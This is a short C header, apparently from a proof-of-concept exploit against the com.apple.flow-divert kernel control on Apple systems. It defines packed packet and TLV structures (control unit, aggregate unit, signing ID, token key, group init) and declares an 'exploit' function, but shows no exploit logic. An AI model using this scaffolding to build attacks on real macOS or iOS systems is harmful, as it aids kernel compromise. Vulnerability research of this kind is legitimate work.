
extern int *__error(void);
#define error (*__error())

#define IPPROTO_TCP 6
#define FLOW_DIVERT_TLV_CTL_UNIT 10
#define FLOW_DIVERT_TLV_AGGREGATE_UNIT 26
#define SO_FLOW_DIVERT_TOKEN 0x1106
#define FLOW_DIVERT_TLV_SIGNING_ID 25

#define CTL_SIZE sizeof(struct sockaddr_ctl)
#define CTL_INFOSZ sizeof(struct ctl_info)
#define CONTROL_NAME "com.apple.flow-divert"

const char *SOCKET_PATH = NULL;

struct control {
  char     Type;
  uint32_t Length;
  uint32_t Unit;
}__attribute__((packed));

struct aggregate {
  char     Type;
  uint32_t Length;
  uint32_t Unit;
}__attribute__((packed));

struct signing_id {
    uint8_t  Type;
    uint32_t Length;
    uint32_t ID;
}__attribute__((packed));

struct flow_divert_create_packet {
  struct control control_unit;
  struct aggregate aggregate_unit;
  struct signing_id signing;
}__attribute__((packed));


#define FLOW_DIVERT_PKT_GROUP_INIT 6
#define FLOW_DIVERT_TLV_TOKEN_KEY 17

struct flow_divert_packet_header {
    uint32_t             packet_type;
    uint32_t             conn_id;
}__attribute__((packed));

struct init_data {
    uint8_t  Type;
    uint32_t Length;
    char     to_BUF[4];
}__attribute__((packed));

struct result_data {
    uint8_t  Type;
    uint32_t Length;
    char     to_BUF[4];
}__attribute__((packed));


#ifndef POC_h
#define POC_h

void exploit(void);

#endif

